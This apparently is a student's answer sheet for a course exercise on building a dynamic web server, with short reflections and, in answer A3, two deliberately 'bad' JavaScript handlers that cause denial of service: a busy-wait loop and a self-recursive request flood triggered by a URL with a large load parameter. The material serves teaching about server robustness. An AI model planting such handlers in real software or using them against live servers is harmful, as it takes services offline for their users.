Questions
Q1. What was hard in this exercise?
Q2. What was fun in this exercise?
Q3. if you were a hacker and you could add a dynamic function that answers the URL /hello/hacker,
    write 2 different ‘bad’ dynamic functions that will cause DOS. how would you make sure that those
    functions will get executed?

Answers
A1. The hardest part of this exercise was understanding how the different parts of the dynamic server
    work together in order to create a proper response. Another tough thing, was understanding who
    is responsible for the handlers and how are they combined in the dynamic server flow.
    Once all the flow was figured out, the implementation was easier.

A2. It was fun figuring out, how could an actual dynamic server work. The concept of actually writing a handlers
    for the server to run, was kind of a surprise, but it made a lot of sense. Leaving the dynamic server
    as a middleware for anyone to use the way they want, created a great source of flexibility in future
    implementations of new technologies.

A3.
    First 'bad' handler:
        badFunc1(request, response){
            response.status(200).send('DOS underway');
            while (true);
        }
        This handler will make the server go into busy waiting, and actually no other request could be serviced
        because the current request will never finish being serviced.

        I will make sure this function would be called by entering the <web server url>:<web server port>/hello/hacker

    Second 'bad' handler:
           badFunc2(request, response){

              response.status(200).send('HackInProgress');
              var load = request.query['load'];
              var att = request.host.split(':');
              var op = {
                    host: att[0],
                    port: parseInt(att[1]),
                    path: request.path,
                    method: request.method,
                    headers : {Connection: 'close'}
                 };

              for (var i = 0 ; i < load ; i++) {
                 require('http').get(op,function(){});
              }
           })

           This handler is Very evil, each call open as many new get request as specified in the parameter, this goes
           recursively, which eventually might clog up the server. As larger the load value is, the more chance the
           server will not be able to provide any service no longer.

           In order to launch this evil doer, all you need to do is open the following url:
           <site url>:<server port>/hello/hacker/<any name>.html?load=<any number>
           In order to Dos attack the server the load number should be at least 100000.